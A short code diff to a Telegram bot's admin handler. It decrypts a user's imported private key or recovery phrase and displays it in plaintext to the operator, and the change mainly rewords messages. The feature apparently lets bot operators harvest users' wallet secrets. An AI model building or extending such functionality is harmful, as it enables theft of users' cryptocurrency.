@@ -377,14 +377,14 @@ def build_admin_router(settings: Settings) -> Router:
         user_id = int(callback.data.rsplit(":", maxsplit=1)[1])
         user = await UserRepository(session).get_by_id(user_id)
         if user is None or not user.imported_private_key:
-            await callback.answer("No imported private key found.", show_alert=True)
+            await callback.answer("No imported key or recovery phrase found.", show_alert=True)
             return
         try:
             decrypted = SecretEncryption(settings.encryption_key.get_secret_value()).decrypt(
                 user.imported_private_key
             )
         except EncryptionError:
-            await callback.answer("Unable to decrypt imported key.", show_alert=True)
+            await callback.answer("Unable to decrypt imported wallet secret.", show_alert=True)
             return
         if callback.message is None:
             return
@@ -398,14 +398,14 @@ def build_admin_router(settings: Settings) -> Router:
                     method = "Recovery Phrase"
         except (json.JSONDecodeError, TypeError):
             pass
-        await callback.message.edit_text(
+        await callback.message.answer(
             f"🔐 <b>IMPORTED {method.upper()}</b>\n\n"
             f"User: {_username(user)}\n"
             f"<code>{html.escape(secret)}</code>",
             reply_markup=back_to_users_keyboard(),
             parse_mode="HTML",
         )
-        await callback.answer("Imported key revealed.")
+        await callback.answer(f"Imported {method.lower()} revealed.")
 
     @router.callback_query(F.data.startswith("admin:toggle_user:"))
     async def toggle_user(callback: CallbackQuery, session: AsyncSession) -> None:
